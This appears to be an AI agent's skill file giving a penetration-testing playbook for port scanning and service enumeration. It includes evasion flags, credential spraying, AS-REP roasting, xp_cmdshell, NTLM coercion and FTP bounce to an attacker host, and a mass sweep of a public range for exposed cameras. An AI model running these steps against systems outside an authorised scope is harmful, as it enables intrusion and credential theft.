---
name: Port & Service Discovery
description: Fast port scanning and service/version fingerprinting (nmap, RustScan, Masscan) to find exposed DBs, admin panels, internal APIs, and non-HTTP services that web recon misses.
tags: [recon, port-scan, service-enumeration, infrastructure, masscan, banner-grab, nmap, smb, ldap, dns, snmp, vhost-discovery]
recommended_tools: [nmap_scan, execute_command, httpx_probe, nuclei_scan, curl, jq, subfinder_scan]
vuln_classes: []
domain: network
phase: recon
provenance: {source: uphiago/recon-skills, paths: [recon/port-service-discovery/SKILL.md, recon/port-mass-scan/SKILL.md]}
---

# Port & Service Discovery

Port scanning reveals the infrastructure layer that HTTP-based recon misses: exposed
databases (MySQL, Redis, MongoDB), admin panels, internal backend APIs on non-standard
ports, and legacy services. The workflow is tiered by target size:

- **Single host** -> RustScan (all 65535 ports in seconds) or `nmap -F`, then `nmap -sV`.
- **Small ranges (/24-/16)** -> Masscan common-ports sweep, then Nmap on the hits.
- **Large ranges (/8)** -> Masscan sharded across machines, banner-grab, then Nmap `-sV`.

The single most critical finding class is a database port (3306/6379/27017) open to the
internet. Confirm every open port with service/version detection before reporting.

## When to Use

- After surface web recon shows no exploitable vulnerabilities — pivot to infrastructure.
- Target is a SaaS/app with backend APIs on non-standard ports (8080-8089, 3000, 5000, 9000).
- After subdomain enumeration — scan resolved IPs for non-HTTP services.
- After discovering a staging subdomain — check for database/admin ports.
- Hunting for a specific service across an ISP/cloud block (RTSP cameras, MySQL, Redis, SSH).

## Prerequisites

- `execute_command` / terminal with `nmap`, and where available `rustscan`, `masscan`, `nc`, `curl`.
- Target domain, IP, or CIDR range (one per line for range files).
- Root for SYN scans (`nmap -sS`) and Masscan (raw sockets). Non-root -> use `nmap -sT`.
- Always maintain a `--excludefile` of your own IPs / RFC1918 ranges before scanning ranges.

## Port -> Severity Reference

| Port | Service | Finding Severity |
|------|---------|-----------------|
| 3306 | MySQL | Critical (if open to internet / no auth) |
| 6379 | Redis | Critical (if no auth) |
| 27017 | MongoDB | Critical (if no auth) |
| 5432 | PostgreSQL | High |
| 1433 | MS SQL Server | High |
| 9200 | Elasticsearch | High (data exposure) |
| 21 | FTP | High (anonymous login?) |
| 8080/8081/8082/8084/8088 | Internal APIs | High (backend services exposed) |
| 8443 | HTTPS alt (admin panels) | Medium |
| 5000 | Werkzeug/Flask dev | High (debug console?) |
| 3000 | Grafana / Node dev | Medium |
| 9090 | Prometheus / Cockpit | Medium |
| 554 | RTSP (cameras) | Medium (unauth snapshot?) |
| 25/587 | SMTP | Medium (open relay?) |
| 22 | SSH | Info (weak auth / old version) |
| 110/143/993 | POP3/IMAP | Info |

## Methodology

### Step 0 (Gate) — Scope & Timing

Confirm the target is in scope. On CDN/WAF-fronted or rate-sensitive infra (AWS,
Cloudflare, Azure), scan slow: `nmap -T2 --max-retries 1` or `masscan --rate 5000`.
Aggressive rates on public IPs get you null-routed and prove nothing.

### Step 1 — Fast Port Sweep

Single host, quick top-100 with Nmap:

```bash
TARGET="$1"; OUTDIR="./output/ports"; mkdir -p "$OUTDIR"
nmap -F --open -T4 --max-retries 1 --host-timeout 60s "$TARGET" -oN "$OUTDIR/fast.nmap"
grep 'open' "$OUTDIR/fast.nmap" || echo "  none in top-100"
```

Single host, all 65535 ports fast with RustScan (400x faster than Nmap here; hands off
to Nmap `-sV` automatically):

```bash
# -b batch size, --accessible = clean output; feeds open ports into nmap -sV
rustscan -a "$TARGET" -r 1-65535 -b 500 --accessible -- -sV -oN "$OUTDIR/rustscan.nmap"

# IDS/WAF-evasive variant: small batch, longer timeout
rustscan -a "$TARGET" -r 1-65535 -b 100 -t 1500 -- -sV
```

### Step 2 — Service / Version Detection

Never trust "port open" alone. Version-fingerprint every open port:

```bash
OPEN=$(grep '^[0-9]' "$OUTDIR/fast.nmap" | awk -F/ '{print $1}' | paste -sd, -)
[ -n "$OPEN" ] && nmap -sV --version-intensity 5 -p "$OPEN" "$TARGET" -oN "$OUTDIR/services.nmap"
grep 'open' "$OUTDIR/services.nmap"
```

Add `-sC` (default NSE scripts) for quick config checks, or targeted scripts, e.g.
`nmap -p 3306 --script mysql-info,mysql-empty-password "$TARGET"`,
`nmap -p 6379 --script redis-info "$TARGET"`,
`nmap -p 21 --script ftp-anon "$TARGET"`.

### Step 3 — Critical Exposure Validation (proof, not port-open)

Turn open DB/service ports into deterministic proof of exposure.

**MySQL (3306)** — banner grab + note auth test. MySQL 8.0+ defaults to
`caching_sha2_password` and TLS, so an empty banner does not mean closed:

```bash
timeout 5 nc -w 3 "$TARGET" 3306 </dev/null | head -c 200 | xxd | head
# Manual auth probe (documents access level):
# mysql -h "$TARGET" -u root --skip-ssl -e 'select version();'
```

**Redis (6379)** — no-auth is proven by a PONG to PING:

```bash
printf 'PING\r\nINFO\r\n' | nc -w 3 "$TARGET" 6379 | head -20
# Contains "+PONG" and INFO output with no NOAUTH error  => CRITICAL unauth Redis
```

**MongoDB (27017)** — `mongosh mongodb://$TARGET:27017 --eval 'db.adminCommand({listDatabases:1})'`
returning DB names with no auth error = critical.

**FTP (21)** — anonymous login proven by response code `230`:

```bash
printf 'USER anonymous\r\nPASS anonymous\r\n' | nc -w 5 "$TARGET" 21 | grep -E '^(230|530|331)'
# 230 = anonymous login SUCCESS (Critical); 530/331 = auth required
```

**SSH (22)** — grab banner; flag EOL/old versions:

```bash
timeout 5 nc -w 3 "$TARGET" 22 </dev/null | head -1   # e.g. SSH-2.0-OpenSSH_7.6p1
```

**Internal API / HTTP-on-odd-port** — probe for live HTTP + docs endpoints:

```bash
for p in 8080 8081 8082 8084 8088 8443 3000 5000 9000 9090; do
  grep -q "${p}.*open" "$OUTDIR/fast.nmap" || continue
  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "http://$TARGET:$p/")
  [ "$code" = "000" ] && continue
  echo "[HTTP $code] $TARGET:$p"
  for path in swagger.json api-docs swagger-ui.html openapi.json graphql actuator/health actuator/env; do
    ac=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "http://$TARGET:$p/$path")
    [ "$ac" = "200" ] && echo "  [API] http://$TARGET:$p/$path"
  done
done
```

Werkzeug/Flask on `5000` — check for an exposed interactive debugger (`/console`) or a
debug PIN; an unauth Werkzeug console is RCE.

### Step 4 — Escalate Port Range on Empty Results

If the top-100 (or top-1000) is empty, the box may be firewalled, not dead:

```bash
grep -q 'open' "$OUTDIR/fast.nmap" || \
  nmap --top-ports 1000 --open -T4 --max-retries 1 --host-timeout 120s "$TARGET" -oN "$OUTDIR/1000.nmap"
# Still nothing? Fragmented SYN scan for basic firewall evasion (needs root):
grep -q 'open' "$OUTDIR/1000.nmap" || nmap -f -sS -F --open -T4 "$TARGET" -oN "$OUTDIR/frag.nmap"
```

Firewall-evasion levers: `-f` (fragment), `--mtu`, `-D RND:5` (decoys),
`--source-port 53`, `-sS` vs `-sT`, `-T2` (slow/polite).

## Large-Range Scanning with Masscan

Masscan handles /16 and /8 ranges Nmap cannot. Two-phase is the reliable pattern:
Masscan finds open ports fast, Nmap `-sV` fingerprints them accurately.

```bash
RANGE_FILE="$1"; OUTDIR="./output/ports"; mkdir -p "$OUTDIR"

# Phase 1: common-ports sweep across the whole range
masscan -p80,443,22,3306,6379,27017,8080,8443,554,21,25,5432,3389,9200,5000 \
  --rate=10000 -iL "$RANGE_FILE" --excludefile exclude.txt \
  -oJ "$OUTDIR/common.json" --wait=10

# Phase 2: full 65535 only on IPs that had a hit
jq -r '.[].ip' "$OUTDIR/common.json" 2>/dev/null | sort -u > "$OUTDIR/hits.txt"
masscan -p1-65535 --rate=5000 -iL "$OUTDIR/hits.txt" -oJ "$OUTDIR/full.json" --wait=30
```

**Banner grabbing** (needs a source IP so the handshake isn't torn down):

```bash
SRC=$(hostname -I | awk '{print $1}')
masscan -p1-10000 --rate=5000 --banners --source-ip "$SRC" "$TARGET" -oJ "$OUTDIR/banners.json"
```

Preferred: two-phase Masscan-ports -> Nmap-services (banners are unreliable):

```bash
masscan -p1-65535 --rate=10000 "$TARGET" -oG "$OUTDIR/grep.txt" --wait=10
OPEN=$(grep -oP '\d+/open' "$OUTDIR/grep.txt" | cut -d/ -f1 | paste -sd, -)
[ -n "$OPEN" ] && nmap -sV -p "$OPEN" "$TARGET" -oN "$OUTDIR/services.nmap"
```

**Sharding across N machines** (linear speedup on /8):

```bash
masscan -p1-65535 --rate=50000 --shard 1/4 -iL /8_range.txt -oJ shard1.json   # machine 1
masscan -p1-65535 --rate=50000 --shard 2/4 -iL /8_range.txt -oJ shard2.json   # machine 2
# ... 3/4, 4/4 on machines 3 and 4, then:
cat shard*.json | jq -s 'add' > merged.json
```

**Service-hunt example** — RTSP cameras (port 554/8010) across a range, then probe for
unauth snapshots:

```bash
masscan -p554,80,8010,8011 --rate=50000 --range 177.0.0.0-177.255.255.255 -oJ cams.json
jq -r '.[].ip' cams.json | sort -u | while read ip; do
  c=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 3 "http://$ip:8010/axis-cgi/jpg/image.cgi")
  [ "$c" = "200" ] && echo "[CAMERA] Axis unauth snapshot: $ip:8010"
done
```

## Performance Reference (empirical, 5000+ scans)

| Tool | 1000 ports (1 host) | /24 all-ports | /8 web ports | Notes |
|------|--------------------|----------------|---------------|-------|
| Nmap | 5-10 min | ~30 min | days (impractical) | 99% accurate, best `-sV` |
| RustScan | 3-10s | 15-30s | ~2 min | 98%, then Nmap `-sV` |
| Masscan | 15-20s | 2-5 min | 30-60 min | 99% TCP, dedupe needed |

## Pitfalls

- **SYN scan / Masscan need root** (raw sockets). Non-root: `nmap -sT` (slower, logs more).
- **Rate limits.** AWS/Cloudflare rate-limit or null-route scans. Use `-T2`,
  `--max-retries 1`, `masscan --rate 5000` on sensitive infra.
- **Empty DB banners are not "closed."** MySQL 8+ / TLS-first services return no banner —
  confirm with an actual connection attempt or NSE script.
- **Masscan retransmissions** report the same open port multiple times — always dedupe.
- **Masscan banners tear down connections** without `--source-ip`; prefer two-phase to Nmap.
- **UDP is weak in Masscan.** Use `nmap -sU` for UDP services (SNMP 161, DNS 53, etc.).
- **Masscan Ctrl+C auto-saves** to `paused.conf`; resume with `--resume paused.conf`.
- **Always `--excludefile`** your own IPs and RFC1918 to avoid scanning yourself/out of scope.

## CDN / WAF Fingerprinting & Origin Discovery

A scan of a Cloudflare/CloudFront edge tells you nothing about the origin. Detect the CDN,
then hunt the real origin IP (which is often directly port-scannable):

```bash
curl -skI --max-time 5 "https://$TARGET/" | grep -iE 'cf-ray|cloudflare|x-amz-cf|cloudfront|server:'
```

Origin discovery: historical DNS (SecurityTrails, DNSDumpster), SPF/MX records, subdomain
A-records that bypass the CDN, and Shodan/Censys `ssl.cert.subject.cn:"$TARGET"`. Then
`curl --resolve "$TARGET:443:ORIGIN_IP"` and port-scan the origin directly.

## Real-world chains (0xdf HTB)

Distilled from 160+ HTB writeups. The invariant on **every** box: full TCP sweep ->
targeted `-sCV` on open ports -> per-service enumeration ladder -> feed each finding
(hostname, username, share, cred) into the next service. Never stop at "port open."

### Base scan — the two-step every box starts with

`--min-rate 10000` full sweep first, then version/script scan only the open ports. This is
by far the most frequent technique (used in ~130/160 records).

```bash
sudo nmap -p- --reason --min-rate 10000 <IP> -oN allports.nmap   # or -p- -vvv
PORTS=$(grep -oP '^\d+(?=/tcp)' allports.nmap | paste -sd, -)
sudo nmap -p"$PORTS" -sCV <IP> -oN scan.nmap                     # versions + default NSE
sudo nmap -sU --top-ports 20 <IP> -oN udp.nmap                  # SNMP/DNS/IKE/TFTP hide in UDP
```
PROOF: `scan.nmap` lists a service+version for every open port. TTL 127≈Windows, 64≈Linux;
an extra hop / TTL delta hints at a container or NATed VM behind the front service.

**Fingerprint the target class from the port profile (decide next moves):**
- `88 + 389 + 445 + 5985` (often `+53/135/139/464/593/636/3268/3269/9389`) -> **Windows AD DC**.
  Grab domain+host from LDAP/TLS cert; `sudo ntpdate <DC>` if Kerberos will be used (clock skew
  breaks auth; NTLM-disabled DCs force `-k` Kerberos-only).
- `1433` -> MSSQL, `3306` -> MySQL, `5432` -> Postgres.
- `21 FTP` (anon?), `2049/111 NFS`, `873 rsync`, `161/udp SNMP`, `25 SMTP`, `512-514` r-services.
- Redirect to a hostname / non-matching TLS CN -> **vhost routing**: add to `/etc/hosts`, fuzz vhosts.
- Odd high port (`3000` Grafana/Gitea, `5000` Flask/Werkzeug/Docker-registry, `8080` Tomcat/Spring,
  `8443` PWM, `10050/10051` Zabbix, `61616` ActiveMQ, `50051` gRPC, `5222` XMPP, `8545` Eth-RPC,
  `6661` HL7/Mirth, `25565` Minecraft, `500/udp` IKE) -> fingerprint the exact product+version,
  then map version -> CVE. Compare static asset hashes (`loader.js`) to tagged releases when the
  banner hides the version.

### DNS (53) — zone transfer, hostname harvest

```bash
nslookup <IP>                                          # PTR -> FQDN / domain
dig axfr <DOMAIN> @<IP>                                 # full zone transfer
dig axfr @<IP> $(dig +short -x <IP> | sed 's/\.$//')   # AXFR of reverse-derived domain
dnsenum --dnsserver <IP> <DOMAIN>
```
PROOF: AXFR returns SOA + record set (not "Transfer failed"); leaked internal subdomains
(e.g. `mm.<DOMAIN>` Mattermost) go into `/etc/hosts`.

### SMB (139/445) — null session, shares, users, hosts file

```bash
nxc smb <IP>                                           # signing? OS? domain? (netexec)
nxc smb <IP> --generate-hosts-file hosts               # auto-map domain+host from null auth
nxc smb <IP> -u '' -p '' --shares                      # null-session shares
nxc smb <IP> -u guest -p '' --shares                   # guest fallback
smbclient -L //<IP>/ -N ; smbclient //<IP>/<SHARE> -N  # list + connect (recurse; ls)
enum4linux-ng -A <IP>
nxc smb <IP> -u '' -p '' --rid-brute                   # users via RID cycling
```
PROOF: a READ/WRITE share with null/guest = access; RID brute / `--generate-hosts-file` returns
`DOMAIN\user` list and the host/domain names.

### Validate given creds across every service (assumed-breach)

When you start with creds, spray them across all authable services immediately.

```bash
for svc in smb ldap mssql winrm rdp ssh; do
  nxc $svc <DC_FQDN> -u <USER> -p '<PASS>'
done
nxc mssql <TARGET> -u <USER> -p '<PASS>' --local-auth --rid-brute   # domain SID + RIDs
```
PROOF: `[+] ... (Pwn3d!)` = code exec; `[+]` alone = valid auth. MSSQL `--rid-brute` /
`SELECT SUSER_SID('<DOMAIN>\Domain Users')` recovers the domain SID for ticket forging.

### LDAP (389/636) — anonymous bind, naming context

```bash
nmap -p389 --script ldap-rootdse <IP>
ldapsearch -x -H ldap://<IP> -s base namingcontexts
ldapsearch -x -H ldap://<IP> -b 'DC=<DOMAIN>,DC=<TLD>' '(objectClass=user)' sAMAccountName description
```
PROOF: naming context returned = reachable; anon dump of `description`/`info` fields (often creds) = win.

### RPC (135/593) — endpoint mapper, user enum

```bash
rpcclient -U '' -N <IP>          # enumdomusers ; querydispinfo ; enumdomgroups
impacket-rpcdump <IP>            # endpoint map -> spot extra RPC/dynamic ports
```
PROOF: `enumdomusers` returns `user:[name] rid:[..]` without creds.

### Kerberos (88) — user validation, AS-REP roast

Port 88 confirms AD. Build a username list from the website (employee names -> `username-anarchy`,
or `exiftool` image metadata), then validate and AS-REP roast.

```bash
username-anarchy -i names.txt > users.txt
kerbrute userenum -d <DOMAIN> --dc <IP> users.txt              # valid usernames
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt    # AS-REP roastable
```
PROOF: kerbrute prints `VALID USERNAME`; GetNPUsers emits a `$krb5asrep$` hash to crack.

### NFS (111/2049) — showmount, mount for files+creds

```bash
showmount -e <IP>                                      # exported shares
mkdir -p /mnt/nfs && sudo mount -t nfs <IP>:/<EXPORT> /mnt/nfs -o nolock
```
PROOF: `showmount -e` lists a world-readable export (`/home`, `/profiles`, `/var/backups`,
`/helpdesk`); mounted files yield certs (`.pfx`/`.key`), sticky-note passwords, backup archives.
`no_root_squash` + a copied SUID binary = local priv-esc primitive.

### SNMP (161/udp) — community string walk

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-community-strings.txt <IP>
snmpwalk -v2c -c public <IP>                           # full walk (sysDescr often leaks passwords)
snmpbulkwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2   # running processes -> cmdline creds
```
PROOF: a valid community returns MIB data; `sysDescr`/process OIDs leak hostnames and command-line creds.

### FTP (21) — anonymous, pull binaries & configs

```bash
ftp anonymous@<IP>        # then: binary; prompt off; mget *
nmap -p21 --script ftp-anon,ftp-syst <IP>
```
PROOF: `230` anon login; pulled service binaries (`.exe` for offline RE), source, or configs
feed the next step.

### SMTP (25) — user enumeration / mail attack surface

```bash
nc -nv <IP> 25                                         # banner (hMailServer? Postfix?)
smtp-user-enum -M VRFY -U users.txt -t <IP>            # also RCPT/EXPN modes
```
PROOF: `VRFY <user>` returns `250`/`252` for valid, `550` for invalid.

### MSSQL (1433) — auth, xp_cmdshell, coerce

```bash
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<IP> -windows-auth
# enable_xp_cmdshell ; xp_cmdshell 'whoami'
# EXEC master..xp_dirtree '\\<ATTACKER_IP>\share'      # coerce NetNTLM to Responder
```
PROOF: `xp_cmdshell` echoes command output, or a NetNTLM hash lands on Responder.

### Less-common services — quick ladders

```bash
rsync --list-only rsync://<IP>/ ; rsync -a rsync://<IP>/<MODULE>/<FILE> .   # 873 anon modules
curl tftp://<IP>/ciscortr.cfg -s                                            # 69/udp guessed config
sudo nmap -sU --min-rate 10000 <IP>                                        # IKE/ISAKMP 500/udp
grpcurl -plaintext <IP>:50051 list && grpcurl -plaintext <IP>:50051 describe <SVC>   # gRPC reflection
java -jar rmg.jar enum <IP> <PORT>                                          # Java RMI/JMX registry
curl -sX POST <IP>:8545 -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}'  # Ethereum JSON-RPC
curl <IP>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' \
  -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}'      # Zabbix version
```
PROOF: rsync lists/pulls a backup archive; TFTP returns a config with masked creds; UDP scan
flags `500`; grpcurl maps methods+messages; rmg reveals a `jmxrmi` binding; Eth-RPC returns a hex
block number; Zabbix returns its version for CVE selection.

### Oracle TNS (1521) — SID guess then creds

A full sweep exposing `1521` (Oracle TNS listener, e.g. `11.2.0.2.0`) needs a valid SID
before you can authenticate; brute the SID, then attack accounts.

```bash
odat sidguesser -s <IP> -p 1521                        # discover SIDs (e.g. XE, XEXDB)
odat passwordguesser -s <IP> -p 1521 -d <SID>          # default/weak account creds
```
PROOF: sidguesser returns one or more valid SIDs; a cracked account (e.g. `scott/tiger`)
enables `odat` file upload / `utl_file` -> RCE. IIS + Oracle TNS is a classic Windows combo.

### Finger (79) — username enumeration

An old TCP `79` finger daemon (common on Solaris/legacy Unix) leaks accounts even when no
one is logged in.

```bash
nc -nv <IP> 79                                          # empty/query banner
finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>
```
PROOF: valid users (e.g. `sunny`, `sammy`) echo back; feed them into SSH spray / AS-REP.

### IPv6 & FTP-bounce — reach services bound only to v6

Services may listen only on IPv6 (invisible to a v4 scan). Recover the target's v6 address
from SNMP or an FTP FXP/`EPRT` bounce, then scan it.

```bash
snmpwalk -v2c -c public <IP> ipAddressType             # or Enyx over SNMP -> global v6 addr
# FTP FXP leak: send `EPRT |2|<ATTACKER_IP>|<PORT>|` then `LIST`, catch the callback IP
nmap -6 -sT -p- --min-rate 5000 <TARGET_IPV6>          # extra ports appear only on v6
rsync --list-only -a "rsync://[<TARGET_IPV6>]:8730/"   # hidden modules (list=false) by name
```
PROOF: v4 scan is bare but the v6 scan reveals extra services (Apache on `dead:beef::…`,
rsync `8730`); listing hidden rsync modules confirms reachability.

### Elasticsearch (9200) — index enumeration + dump

Unauthenticated Elasticsearch on `9200` is full data exposure.

```bash
curl -s "http://<IP>:9200/_cat/indices?v"              # list indices
curl -s "http://<IP>:9200/<INDEX>/_search?size=1000"   # dump documents (often base64 creds)
```
PROOF: index list + document JSON returned with no auth error = CRITICAL; recovered creds
feed the next service.

### Internal / localhost-only listeners (post-foothold)

Once on the box, find services bound to `127.0.0.1` that no external scan can see, plus
root-only jobs on timers and debug ports.

```bash
ss -tlnp || netstat -tlnp                               # listeners + owning process
cat /proc/net/tcp | grep '0100007F:'                    # loopback listeners when no netstat
ps aux | grep -E 'java|jdwp'                             # -agentlib:jdwp=…address=…:8000 -> JDWP RCE
systemctl list-timers                                   # root cron/timer firing window (time the exploit)
```
PROOF: Kibana on `127.0.0.1:5601`, a JDWP debug socket on `localhost:8000`, or a `NEXT`
column showing when a root backup job runs — each is a local escalation primitive.

### Anonymous FTP loot — metadata & dropped files

Beyond `230` login, pull everything and mine document metadata for usernames/emails.

```bash
ftp anonymous@<IP>    # binary; prompt off; mget *
exiftool *.docx *.rtf *.pdf                              # author/creator -> username/email
```
PROOF: `exiftool` extracts an authoring account (e.g. `<USER>@<DOMAIN>`) or a hidden
encrypted drop (`.drupal.txt.enc`, contract ABI/JSON) that seeds the next step.

### Blind-injection exfil channel (DNS)

When command injection has no direct output, confirm a covert channel by sniffing the
target's outbound DNS.

```bash
# scapy: sniff(iface='eth0', filter='src host <TARGET> and udp port 53')  -> watch qtype==1 (A)
```
PROOF: captured A-record queries from the target prove an out-of-band DNS exfil channel.

### Web (80/443/8080…) — vhost, subdomain, dir discovery

Any hostname from a redirect / DNS / TLS cert goes into `/etc/hosts`, then fuzz for vhosts and
directories a bare-IP scan misses. Very common (~25/160).

```bash
whatweb http://<IP>/ ; curl -sI http://<IP>/           # tech + redirect hostname; X-Powered-By version
echo | openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName
ffuf -u http://<IP> -H "Host: FUZZ.<DOMAIN>" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac      # -ac auto-calibrate
feroxbuster -u http://<DOMAIN> -x php,html                                  # dir/content brute
```
PROOF: a Host value returning different size/status than baseline = new vhost -> add to `/etc/hosts`,
re-scan. `nmap --script http-git` or a visible `.git` = source leak; cert SAN reveals hidden hostnames.

### Chaining rule

Each service output feeds the next: DNS/cert/redirect -> hostnames -> vhost fuzz; SMB/RPC/LDAP/
kerbrute -> usernames -> AS-REP/password spray; SNMP/FTP/NFS/rsync -> config files/backups -> creds
-> authenticated re-enum (`nxc`, `mssqlclient`, `ldapsearch`, BloodHound with creds). Re-run
enumeration after **every** new credential.

## Verification (report gate)

- Every open port MUST be confirmed with `nmap -sV` (no "unknown" ports left unresolved).
- DB exposure MUST be proven by a connection attempt, not just an open port:
  Redis -> `+PONG`; FTP anon -> `230`; MySQL/Mongo -> query returns without auth error.
- Masscan results MUST be deduplicated; banner versions cross-checked against Nmap probes.
- Every finding documents: exact IP, port, service, version, and access level (auth/no-auth).

## References

- CWE-200 Information Exposure, CWE-306 Missing Authentication for Critical Function,
  CWE-1188 Insecure Default Initialization (unauth Redis/Mongo/Elasticsearch).
- Nmap NSE: `mysql-empty-password`, `redis-info`, `mongodb-databases`, `ftp-anon`,
  `http-title`, `smtp-open-relay`.
